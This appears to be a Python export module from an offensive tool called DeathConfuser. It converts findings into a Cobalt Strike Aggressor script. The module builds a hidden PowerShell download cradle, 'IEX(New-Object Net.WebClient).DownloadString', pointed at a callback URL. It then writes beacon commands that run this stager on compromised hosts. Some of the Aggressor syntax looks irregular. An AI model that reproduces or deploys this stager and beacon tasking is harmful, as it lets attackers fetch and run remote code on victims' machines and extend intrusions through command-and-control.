"""Export findings in a Cobalt Strike compatible format."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Dict, Iterable, Any

from ..core.logger import get_logger


def _powershell_stager(url: str) -> str:
    return (
        "powershell -nop -w hidden -c "
        f"\"IEX(New-Object Net.WebClient).DownloadString('{url}')\""
    )


def export(findings: Iterable[Dict[str, Any]], out_file: Path, callback_url: str) -> None:
    """Write findings to an Aggressor Script file for import into Cobalt Strike."""
    log = get_logger(__name__)
    stager = _powershell_stager(callback_url)
    items = list(findings)
    with out_file.open("w") as f:
        f.write("# Aggressor script generated by DeathConfuser\n")
        f.write(f"global_callback = \"{callback_url}\";\n")
        for item in items:
            data = json.dumps(item).replace('"', '\"')
            f.write(f'println("{data}");\n')
            f.write(f'beacon_command beacons {{bshell $1 \"{stager}\"}};\n')
    log.info("Exported %d findings to %s", len(items), out_file)
